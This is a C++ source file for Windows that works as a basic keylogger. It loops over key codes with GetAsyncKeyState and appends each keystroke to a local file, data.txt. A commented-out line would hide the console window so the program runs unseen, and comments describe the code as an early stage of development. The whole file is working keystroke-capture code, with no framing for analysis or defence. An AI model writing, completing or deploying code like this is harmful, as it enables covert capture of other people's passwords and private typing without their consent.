#include <iostream>
#include <fstream>
#include <Windows.h>
using namespace std;

//functions used:
void StartLog(string input);


int main()
{
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	//cout << "hello";
	//StartLog("hi");

	char InputChar;

	for (;;)
	{
		Sleep(10);
		for (int InputChar=8; InputChar<=190; InputChar++)
		{
			if (GetAsyncKeyState(InputChar) == -32767) {
				fstream DataLog;
				DataLog.open("data.txt", fstream::app);

				if (DataLog.is_open())
				{
					DataLog << char(InputChar);
					DataLog.close();
				}
			}
		}
	}
}

	


//Pretty self explanatory. File is opened and the string inputted is entered.
//Since its still an initial phase it will only print "hi" into the txt accordng to main.
void StartLog(string input)
{
	fstream DataLog;
	DataLog.open("data.txt", fstream::app);

	if (DataLog.is_open())
	{
		DataLog << input;
		DataLog.close();
	}

}